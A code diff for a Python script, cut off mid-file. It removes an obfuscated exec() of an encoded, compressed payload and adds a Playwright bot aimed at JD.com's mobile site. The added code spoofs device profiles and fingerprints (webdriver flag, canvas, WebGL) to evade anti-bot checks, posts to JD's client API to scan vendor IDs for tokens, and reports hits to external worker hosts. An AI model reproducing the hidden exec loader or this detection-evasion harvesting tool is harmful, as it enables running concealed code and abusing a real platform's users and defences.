@@ -1,2 +1,314 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'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'))
+import os
+import sys
+import time
+import json
+import random
+import requests
+import re
+from datetime import datetime, timedelta, timezone
+from playwright.sync_api import sync_playwright
+from cf_db import CF_VID, CF_TOKEN, CF_MSG
+
+# 尝试导入 stealth
+try:
+    from playwright_stealth import stealth_sync
+except ImportError:
+    def stealth_sync(page): pass
+
+# ================= 配置 =================
+API_KEY = os.environ.get("API_KEY", "leaflow")
+TARGET_PATTERN = os.environ.get("TARGET_PATTERN", "2PAAf74aG3D61qvfKUM5dxUssJQ9")
+WORKER_VID_URL = os.environ.get("WORKER_VID_URL", "https://vid.zshyz.us.ci")
+WORKER_MSG_URL = os.environ.get("WORKER_MSG_URL", "https://msg.zshyz.us.ci")
+WORKER_TOKEN_URL = os.environ.get("WORKER_TOKEN_URL", "https://token.zshyz.us.ci")
+RUN_DURATION_MINUTES = int(os.environ.get("RUN_DURATION_MINUTES", 10))
+MAX_CONSECUTIVE_ERRORS =int(os.environ.get("MAX_CONSECUTIVE_ERRORS", 10))
+COPIES = int(os.environ.get("COPIES", 46))
+NUM_PARTS = int(os.environ.get("NUM_PARTS", 20))
+REPO = int(os.environ.get("REPO", 1))
+MAX_RETRY_ROUNDS = 3  # 失败重试次数上限
+script_idx=0
+# ========================================={"success": 成功次数, "hit": 获取token数, "blocked": 最后剩余未扫, "error": 错误次数, 'total_scanned': 总扫描次数}
+
+stats = {"success": 0, "hit": 0, "blocked": 0, "error": 0, 'total_scanned': 0}
+import random
+
+def generate_device_profile():
+    # 定义真实设备的物理参数库 (逻辑分辨率)
+    # 格式: { "设备名": (width, height, pixel_ratio) }
+    device_configs = {
+        "iPhone 15/14/13 Pro": {"width": 390, "height": 844, "ratio": 3},
+        "iPhone 15/14 Pro Max": {"width": 430, "height": 932, "ratio": 3},
+        "Pixel 7": {"width": 412, "height": 915, "ratio": 2.6},
+        "Samsung Galaxy S23": {"width": 360, "height": 800, "ratio": 3},
+        "Xiaomi 13": {"width": 393, "height": 873, "ratio": 3}
+    }
+    
+    device_name = random.choice(list(device_configs.keys()))
+    config = device_configs[device_name]
+    
+    # 稍微给尺寸加一点“波动”（模拟某些浏览器UI占用导致的差异，可选）
+    # 但通常直接使用逻辑分辨率是最稳妥的
+    viewport = {
+        "width": config["width"],
+        "height": config["height"]
+    }
+    
+    # 匹配对应的 UA
+    if "iPhone" in device_name:
+        ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+    else:
+        chrome_ver = f"{random.randint(140, 146)}.0.{random.randint(6000, 7000)}.100"
+        ua = f"Mozilla/5.0 (Linux; Android 14; {device_name}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
+        
+    return {
+        "device": device_name,
+        "ua": ua,
+        "viewport": viewport,
+        "deviceScaleFactor": config["ratio"] # 很多人会漏掉这个关键的缩放因子
+    }
+
+# 生成示例
+profile = generate_device_profile()
+device_scale_factor=profile['deviceScaleFactor']
+print(f"模拟设备: {profile['device']}")
+Viewport=profile['viewport']
+print(f"Viewport: {Viewport}")
+user_agent=profile['ua']
+print(f"User-Agent: {user_agent}")
+
+def log(msg, level="INFO"):
+    timestamp = time.strftime("%H:%M:%S", time.localtime())
+    icons = {"INFO": "ℹ️", "SUCCESS": "✅", "ERROR": "❌", "WARN": "⚠️", "STATS": "📊", "SYNC": "📡", "RAW": "📝","RISK": "🧠"}
+    print(f"[{timestamp}] {icons.get(level, '•')} {msg}", flush=True)
+
+def split_and_get_my_part(data_list):
+    global script_idx
+    file_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]
+    match = re.search(r'(\d+)$', file_name)
+    script_idx = int(match.group(1)) if match else 0
+    avg = len(data_list) / NUM_PARTS
+    parts = [data_list[int(i * avg): int((i + 1) * avg)] for i in range(NUM_PARTS)]
+    idx = (script_idx - 1) if script_idx > 0 else 0
+    return parts[idx] if idx < len(parts) else []
+    
+def get_halved_array(data_list, repo_val):
+    """
+    根据 REPO 的值获取数组的前半部分或后半部分。
+    repo_val: 1 表示前半部分，2 表示后半部分
+    """
+    length = len(data_list)
+    
+    # 使用整除 // 找到中点
+    mid = length // 2
+    
+    if repo_val == 1:
+        # 获取 [0, mid) 的元素
+        return data_list[:mid]
+    elif repo_val == 2:
+        # 获取 [mid, length) 的元素
+        return data_list[mid:]
+    else:
+        raise ValueError("REPO 的值必须是 1 或 2")
+        
+def cooldown_sleep(streak):
+    if streak == 1:
+        t = random.uniform(4, 6)
+    elif streak == 2:
+        t = random.uniform(8, 12)
+    else:
+        t = random.uniform(14, 18)
+    #log(f"风控冷却 sleep {t:.1f}s", "RISK")
+    time.sleep(t)
+
+def run_task(): 
+    global RUN_DURATION_MINUTES
+    db_vid = CF_VID(WORKER_VID_URL, API_KEY)
+    db_msg = CF_MSG(WORKER_MSG_URL, API_KEY)
+    db_token = CF_TOKEN(WORKER_TOKEN_URL, API_KEY)
+
+    # 1. 查询 IP
+    try:
+        current_ip = requests.get('https://api.ipify.org', timeout=10).text
+        log(f"任务启动 IP: {current_ip}", "INFO")
+    except: pass
+
+    bj_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=8)))
+    
+    # 核心：计算半小时分片
+    slice_idx = bj_now.hour * 2 + (1 if bj_now.minute >= 30 else 0)
+    
+    log(f"⏰ 北京时间: {bj_now.strftime('%Y-%m-%d %H:%M:%S')} | 分片: {slice_idx}")
+
+    # 这里建议确保你的环境变量 COPIES 设置为 48
+    result = db_vid.get_data_slice(copy=slice_idx, copies=COPIES)
+    vender_ids = split_and_get_my_part(result.get("data", []))
+    vender_ids = get_halved_array(vender_ids, REPO)
+    log(f"任务分配: 本分片({slice_idx}-{REPO})执行 {len(vender_ids)} 条", "INFO")
+    # 最长运行时间校正，设定值减去当前超出0分或30分的分钟数，防止到0分或30分脚本不停。
+    RUN_DURATION_MINUTES=RUN_DURATION_MINUTES-(bj_now.minute-30 if bj_now.minute >= 30 else bj_now.minute)
+    log(f"修正分钟数({bj_now.minute-30 if bj_now.minute >= 30 else bj_now.minute})，将运行 {RUN_DURATION_MINUTES}分钟。", "INFO")
+
+    if not vender_ids:
+        return
+
+    script_start_time = time.time()
+    consecutive_errors = 0
+    # 待处理队列，初始为全量，重试时仅保留失败部分
+    pending_vids = vender_ids
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(
+            headless=True,
+            args=[
+                "--disable-blink-features=AutomationControlled",
+                "--no-sandbox",
+                "--disable-setuid-sandbox",
+                "--disable-infobars",
+                "--window-position=0,0",
+                "--ignore-certificate-errors",
+            ]
+        )
+
+        context = browser.new_context(
+            user_agent=user_agent,
+            viewport=Viewport,
+            device_scale_factor=device_scale_factor,
+            is_mobile=True,
+            has_touch=True,
+            locale="zh-CN",
+            timezone_id="Asia/Shanghai"
+        )
+
+        log("任务启动：已加载深度 Stealth 优化配置", "INFO")
+
+        def scan_round(target_list, round_tag):
+            nonlocal consecutive_errors
+            round_failed = []
+            
+            for vid in target_list:
+                stats['total_scanned'] += 1
+                if (time.time() - script_start_time) / 60 >= RUN_DURATION_MINUTES:
+                    log(f"达到时长上限，停止{round_tag}", "TIMER")
+                    return False, round_failed
+
+                page = context.new_page()
+                stealth_sync(page)
+                page.add_init_script("""
+                    (() => {
+                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                        window.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {}, app: {} };
+                        Object.defineProperty(navigator, 'languages', {get: () => ['zh-CN', 'zh', 'en']});
+                        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+                        const originalCanvasToDataURL = HTMLCanvasElement.prototype.toDataURL;
+                        HTMLCanvasElement.prototype.toDataURL = function(type) {
+                            if (type === 'image/png') {
+                                const ctx = this.getContext('2d');
+                                if (ctx) {
+                                    ctx.fillStyle = 'rgba(255, 255, 255, 0.01)';
+                                    ctx.fillRect(1, 1, 1, 1);
+                                }
+                            }
+                            return originalCanvasToDataURL.apply(this, arguments);
+                        };
+                        const getParameter = WebGLRenderingContext.prototype.getParameter;
+                        WebGLRenderingContext.prototype.getParameter = function(parameter) {
+                            if (parameter === 37445) return 'Apple Inc.'; 
+                            if (parameter === 37446) return 'Apple GPU';
+                            return getParameter.apply(this, arguments);
+                        };
+                    })();
+                """)
+
+                try:
+                    page.goto(f"https://m.jd.com", wait_until="domcontentloaded", timeout=20000)
+                    page.mouse.move(random.randint(0, 100), random.randint(0, 100))
+                    page.mouse.wheel(0, random.randint(500, 800))
+                    time.sleep(random.uniform(1.5, 3))
+
+                    fetch_script = f"""
+                    async () => {{
+                        try {{
+                            const res = await fetch("https://api.m.jd.com/client.action", {{
+                                "method": "POST",
+                                "headers": {{"accept": "*/*",
+                                              "accept-language": "zh-CN,zh;q=0.9",
+                                              "cache-control": "no-cache",
+                                              "content-type": "application/x-www-form-urlencoded",
+                                              "pragma": "no-cache",
+                                              "priority": "u=1, i",
